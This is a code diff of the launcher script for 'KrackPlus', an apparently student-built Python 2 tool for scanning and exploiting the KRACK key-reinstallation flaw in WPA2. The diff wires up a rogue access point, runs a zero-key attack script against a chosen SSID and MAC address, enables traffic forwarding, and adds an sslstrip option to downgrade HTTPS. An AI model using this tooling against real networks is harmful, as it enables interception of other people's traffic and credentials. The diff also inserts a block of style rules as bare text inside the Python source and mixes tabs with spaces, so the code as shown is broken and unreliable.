@@ -36,25 +36,24 @@ log.addHandler(stream)
 #log.error("Serious stuff, this is red for a reason")                 RED
 #log.critical("OH NO everything is on fire")                          SUPER RED/ORANGE
 
-log.debug("KRACK+ is a tool to scan for and exploit the KRACK vulnerability in WPA2, discovered by Mathy Vanhoef.")
-log.debug("KRACK+ 1.0 by Lars Magnus Trinborgholen, Fredrik Walloe and Lars Kristian Maehlum.\n")
+
+I  Members must use four spaces rather than tab
+II  Comments must be in English
+III  CONST must be all capital letters
+IV  Spaces between operator signs:  A + B rather than A+B
+V  Comments must be on the line above
+VI  When introducing only air, only use one page-shift
+VII  Between functions, two page-shifts
+VIII  Between classes and functions, three page-shifts
+
+log.debug("KrackPlus is a tool to scan for and exploit the KRACK vulnerability in WPA2(CVE-2017-13077 & CVE-2017-13080), discovered by Mathy Vanhoef.")
+log.debug("KrackPlus 1.0 by Lars Magnus Trinborgholen, Fredrik Walloe and Lars Kristian Maehlum.\n")
 
 def main():
-    USAGE = "\nKRACK+ Scan: krackPlus [-s]\nKRACK+ Attack: krackPlus [-a] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address]"
+    USAGE = "\nKrackPlus Scan:   ./krackPlus.py [-s]\n\t          ./krackPlus.py [-s] [--set-ssid SSID] [--set-password PASSWORD] [--path PATH]\nKrackPlus Attack: ./krackPlus.py [-a] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address]"
     path = 'reports/'
     parser = optparse.OptionParser(usage=USAGE)
     subprocess.call(["bash displayInterfaces.sh"],shell=True)	
-
-    # KRACK+ Attack options
-    parser.add_option('--attack', '-a', default=False, help="This option will run a key reinstallation attack against ....", dest='attack', action='store_true')
-    parser.add_option('--target', '-t', help="This option is used to specifiy target device using MAC-adress when running attack.", dest='target')
-    parser.add_option('--target-ssid', help="This option is used to specify target network/ssid", dest='targetSSID')
-    parser.add_option('--nic-mon', help="This option is used to specify Wireless monitor interface that will listen on the"
-                        "channel of the target AP. Should be your secondary NIC, i.e USB NIC.", dest='mon')
-    parser.add_option('--nic-rogue-ap', help="This option is used to specify Wireless monitor interface that will run a rogue AP"
-                        "using a modified hostapd.", dest='rogue')
-    parser.add_option('--pcap', help="Save packet capture to file as a pcap. Provide a filename; $NIC.pcap will be appended to the name. Not compatible with --dd", dest='pcap')
-
 
     # KRACK+ Scan options
     parser.add_option('--scan','-s', help="This option will create a network with SSID 'testnetwork' where the default password is 'abcdefgh'."
@@ -64,18 +63,26 @@ def main():
                       " Password length has to be 8 characters or more!", dest='password')
     parser.add_option('--path', '-p', help="Set path where scan report should be saved", dest='path')
 
+ # KRACK+ Attack options
+    parser.add_option('--attack', '-a', default=False, help="This option will run a key reinstallation attack against ....", dest='attack', action='store_true')
+    parser.add_option('--target', '-t', help="This option is used to specifiy target device using MAC-adress when running attack.", dest='target')
+    parser.add_option('--target-ssid', help="This option is used to specify target network/ssid", dest='targetSSID')
+    parser.add_option('--nic-mon', help="This option is used to specify Wireless monitor interface that will listen on the"
+                        "channel of the target AP. Should be your secondary NIC, i.e USB NIC.", dest='mon')
+    parser.add_option('--nic-rogue-ap', help="This option is used to specify Wireless monitor interface that will run a rogue AP"
+                        "using a modified hostapd.", dest='rogue')
+    parser.add_option('--pcap', help="Save packet capture to file as a pcap. Provide a filename; $NIC.pcap will be appended to the name. Not compatible with --dd", dest='pcap')
+    parser.add_option('--sslstrip', help="Use this option to enable sslstrip in an attempt to downgrade HTTPS to HTTP.", action='store_true')
 
     # General KRACK+ options:
     parser.add_option('--restore', '-r', help="This option will restore internet connection (wifi). Hopefully you'll never have to use this option.", dest='restore', default=False, action='store_true')
     parser.add_option('-d', help="This option will increase output verbosity for KRACK+ Scan or Attack", dest='debug', action='store_true')
     parser.add_option('--dd', help="This option will increase output verbosity even more for KRACK+ Scan or Attack (debugging purposes). Can be combined with -d", dest='dd', action='store_true')
-
     
     options, args = parser.parse_args()
     
     ############# SCAN ################
     if options.scan and not options.attack:
-
         # Write the credentials to file, so that they can be used next time the progran runs.
         with open('./networkCredentials.txt', 'w') as netCredentials:
             if len(options.password) >= 8:
@@ -151,30 +158,32 @@ def main():
 			destination="reports/"
                         subprocess.call(["mv " + "krackattacks-poc-zerokey/krackattack/" + "*pcap " + destination], shell=True)
 
+                elif options.sslstrip:
+                    subprocess.Popen(["sslstrip -w sslstrip.log &"], shell=True)
+
 		else: 
 			subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                  options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
-
+                
                 subprocess.Popen(["cd krackattacks-poc-zerokey/krackattack/ && bash enable_internet_forwarding.sh > /dev/null &"], shell=True)
-                subprocess.Popen(["sslstrip -w sslstrip.log &"], shell=True)
-	
-		print("Open Wireshark to see traffic")
+                
+		log.info("Open Wireshark to see traffic")
 		# User will only see relevant output, unless debug is on
 		if options.debug:
-			print("Debug enabled")
+			log.info("Debug enabled")
 		else:            	
 			attackParser()
 
         except KeyboardInterrupt, e:
    	    subprocess.call(["clear"], shell=True)
-	    print e
+	    log.error(e)
             log.info("Cleaning up and restoring wifi ...")
 	    subprocess.call(["rm attackOutput.txt"], shell=True)
             subprocess.call(["./restoreClientWifi.sh"])
 
 	except:
 	    subprocess.call(["clear"], shell=True)
-            log.info("Error occurred. Restoring wifi ...")
+            log.error("Error occurred. Restoring wifi ...")
             subprocess.call(["rm attackOutput.txt"], shell=True)
             subprocess.call(["./restoreClientWifi.sh"])
 
@@ -188,6 +197,7 @@ def main():
     elif options.attack and options.scan:
         log.warn("Scan and attack cannot be run simultaneously. Please specify either [-a] or [-s].")
         parser.print_help()
+        
     else:
         log.warn("No option was given or there were missing arguments, please see usage below and try again!")
         parser.print_help()
